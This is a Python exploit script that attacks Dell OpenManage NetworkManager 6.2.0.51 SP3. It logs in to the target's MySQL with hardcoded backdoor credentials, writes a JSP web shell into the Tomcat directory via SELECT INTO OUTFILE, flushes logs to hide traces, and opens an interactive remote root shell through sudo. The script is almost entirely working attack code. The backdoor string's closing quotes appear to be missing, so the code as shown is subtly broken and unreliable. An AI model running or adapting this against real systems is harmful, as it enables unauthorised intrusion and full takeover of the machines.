#!/usr/bin/python
# Usage:  $ python dell-openmanage-networkmanager_rce.py --host 1.3.3.7
# Dell OpenManage NetworkManager 6.2.0.51 SP3
# SQL backdoor remote root
#
from optparse import OptionParser
from string import ascii_letters, digits
from random import choice
from re import compile as regex_compile
from urllib import urlopen
import pymysql.cursors

banner = """Dell OpenManage NetworkManager 6.2.0.51 SP3\nSQL backdoor remote root\n"""
accounts = ['root','owmeta','oware']
password = 'dorado'
regex = regex_compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")

full_path = '/opt/VAroot/dell/openmanage/networkmanager/oware/synergy/tomcat-7.0.40/webapps/nvhelp/%s.jsp' % (''.join(
    [choice(digits + ascii_letters) for i in xrange(8)]))
shell_name = full_path.split('/')[-1]

backdoor = """<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    String m = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>

def do_shell(ip_address):
    fd = urlopen("http://%s:8080/nvhelp/%s" % (ip_address,shell_name),"cmd=%s" % ('sudo sh -c id'))
    print "[-] %s\n" % fd.read().strip()
    fd.close()
    while True:
        try:
            cmd = 'sudo sh -c %s' % raw_input("# ")
            if ('exit' in cmd or 'quit' in cmd):
                break
            fd = urlopen("http://%s:8080/nvhelp/%s" % (ip_address,shell_name),"cmd=%s" % (cmd))
            print fd.read().strip()
            fd.close()
        except KeyboardInterrupt:
            print "Exiting."
            exit(0)
    return False

if __name__=="__main__":
  print banner
  parser = OptionParser()
  parser.add_option("--host",dest="host",default=None,help="Target IP address")
  o, a = parser.parse_args()
  if o.host is None:
      print "[!] Please provide the required parameters."
      exit(1)
  elif not regex.match(o.host):
      print "[!] --host must contain an IP address."
      exit(1)
  else:
      print "[-] Starting attack."
      try:
          for user in accounts:
              conn = pymysql.connect(host=o.host,
                                     user=user,
                                     password=password,
                                     db='mysql',
                                     cursorclass=pymysql.cursors.DictCursor
                                    )
              if conn.user is user:
                  print "[+] Connected using %s account." % (user)
                  cursor = conn.cursor()
                  print "[+] Sending malicious SQL."
                  table_name = ''.join(
                      [choice(digits + ascii_letters) for i in xrange(8)])
                  column_name = ''.join(
                      [choice(digits + ascii_letters) for i in xrange(8)])
                  cursor.execute('create table %s (%s text)' % (table_name, column_name))
                  cursor.execute("insert into %s (%s) values ('%s')" % (table_name, column_name, backdoor))
                  conn.commit()
                  cursor.execute('select * from %s into outfile "%s" fields escaped by ""' % (table_name,full_path))
                  cursor.execute('drop table if exists `%s`' % (table_name))
                  conn.commit()
                  cursor.execute('flush logs')
                  print "[+] Dropping shell."
                  do_shell(o.host)
                  break
      except Exception as e:
          if e[0] == '1045':
              print "[!] Hardcoded SQL credentials failed." % (e)
          else:
              print "[!] Could not execute attack. Reason: %s." % (e)
          exit(0)